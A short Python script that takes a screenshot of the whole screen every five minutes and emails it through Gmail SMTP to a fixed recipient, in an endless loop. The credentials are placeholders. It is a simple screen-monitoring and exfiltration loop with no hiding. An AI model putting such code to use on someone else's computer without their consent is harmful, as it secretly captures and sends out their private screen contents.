import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from PIL import ImageGrab  # Pillow library for screenshots

# Email configuration
email_address = "your_email@gmail.com"
email_password = "your_email_password"
recipient_email = "recipient@example.com"

# Function to take a screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    return screenshot

# Function to send email with screenshot as attachment
def send_email(subject, body, attachment):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = recipient_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    img_data = open(attachment, 'rb').read()
    image = MIMEImage(img_data, name=attachment)
    msg.attach(image)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, recipient_email, msg.as_string())
    server.quit()

# Main loop
while True:
    try:
        screenshot = take_screenshot()
        screenshot.save("screenshot.png")  # Save the screenshot
        send_email("Screenshot", "Here's the screenshot.", "screenshot.png")
        print("Screenshot sent successfully.")
    except Exception as e:
        print("An error occurred:", e)

    time.sleep(300)  # Wait for 5 minutes

